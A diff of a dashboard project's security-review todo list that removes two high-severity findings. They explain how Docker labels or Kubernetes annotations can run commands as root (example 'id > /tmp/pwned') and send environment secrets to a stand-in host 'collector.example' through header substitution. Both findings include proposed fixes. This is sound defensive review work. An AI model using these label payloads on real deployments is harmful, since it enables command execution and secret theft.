@@ -8,29 +8,6 @@ The widgets collection keeps its own list: `../dashboard-widgets/todo.md`.
 Findings of a review of the server, discovery, the widget runtime, the installer, the image and
 the page, most severe first. "Verified" means reproduced against the code as it is.
 
-- [ ] **High: a Docker label (or Kubernetes annotation) can run commands on the dashboard.**
-  Discovery passes every `dashboard.widget.*` / `homepage.widget.*` label into the widget's
-  options, so `dashboard.widget.type=button` with `dashboard.widget.command=…` (and
-  `dashboard.widget.user=root`) puts a button on the page that runs that command as `node`, or as
-  root with `DASHBOARD_ALLOW_ROOT_SCRIPTS`. Labels come from whoever starts a container, and also
-  from images: a `LABEL` baked into a third-party image is enough. The same goes for an Ingress
-  annotation in Kubernetes, `script:` instead of `command:`, a `target: hidden-iframe` `href`
-  (the server then calls any URL), an `iframe` `src` (adds a frame origin to the CSP) and any
-  widget's `url` (server-side requests anywhere on the network). Verified for the button:
-  `serviceFromLabels` returns `{ type: 'button', command: 'id > /tmp/pwned', user: 'root' }`.
-  Fix: options that run things or reach elsewhere only from the YAML config; for discovered
-  services refuse `button` `command`/`script`/`user`, `hidden-iframe`, and options listed by a new
-  widget.yaml flag (e.g. `discoverable: false`), with a config message; or an allowlist of widget
-  types discovery may create (`docker.yaml` `allowWidgets:`). Document it under Docker and Kubernetes.
-- [ ] **High: a label can send the dashboard's secrets anywhere.** `src/discovery/index.js` runs
-  every discovered service through `substitute()`, so a label can use any `{{DASHBOARD_VAR_*}}` or
-  `{{HOMEPAGE_VAR_*}}` (all of the dashboard's environment variables of that form, not only its
-  own): `dashboard.widget.type=custom-api`, `dashboard.widget.url=https://collector.example/`,
-  `dashboard.widget.headers.X=…{{DASHBOARD_VAR_SHELLY_PASSWORD}}` makes the server send the
-  password out on every refresh. Seen in the code (lines 53-58); the browser never sees it, the
-  attacker's server does. Fix: no variable substitution in discovered labels by default (opt in
-  per server in `docker.yaml`, or per name: `allowVariables: [GRAFANA]`); same fix as above for
-  which options a label may set.
 - [ ] **Low (with `*` only): DNS rebinding past the CSRF check.** Host names are checked by
   default now (only `localhost`, IP addresses and `allowedHosts`), which stops it. With
   `allowedHosts: "*"` a rebound page is same-origin again and may send
